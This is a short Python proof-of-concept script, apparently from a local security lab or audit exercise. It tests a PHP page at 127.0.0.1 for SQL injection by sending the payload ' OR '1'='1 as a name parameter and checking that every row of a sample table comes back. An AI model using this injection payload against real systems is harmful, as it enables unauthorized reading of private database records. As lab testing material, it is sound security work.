#!/usr/bin/env python3
import http.client
import re
import sys
import urllib.parse

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S007/index.php"
TIMEOUT = 10

ROW_RE = re.compile(r"<p>ID\s*([^：<]+)：([^<]+)</p>")


def fetch_records(name):
    query = urllib.parse.urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
    try:
        conn.request(
            "GET",
            PATH + "?" + query,
            headers={"User-Agent": "S007-audit-poc"},
        )
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        status = resp.status
    finally:
        conn.close()

    if status != 200:
        raise RuntimeError(f"意外 HTTP 状态: {status}, body={body[:200]!r}")

    records = set()
    for row_id, row_name in ROW_RE.findall(body):
        records.add((row_id.strip(), row_name.strip()))
    return records


def main():
    normal = fetch_records("Alice")
    test = fetch_records("' OR '1'='1")

    expected_normal = {("1", "Alice")}
    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    print("普通请求解析记录:", normal)
    print("测试请求解析记录:", test)

    if normal != expected_normal:
        print("普通对照失败：请检查 lab_people 初始数据、bootstrap 的 $db、入口路径和 PHP 错误日志。")
        return 1

    if test != expected_test:
        print("测试断言失败：未观察到预期的三行业务记录；请检查数据库数据、查询错误和运行前提。")
        return 1

    print("断言通过：普通请求仅返回 Alice，测试请求返回三行业务记录。")
    print("注意：本脚本只读 SELECT，不修改数据库；未实际执行验证。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
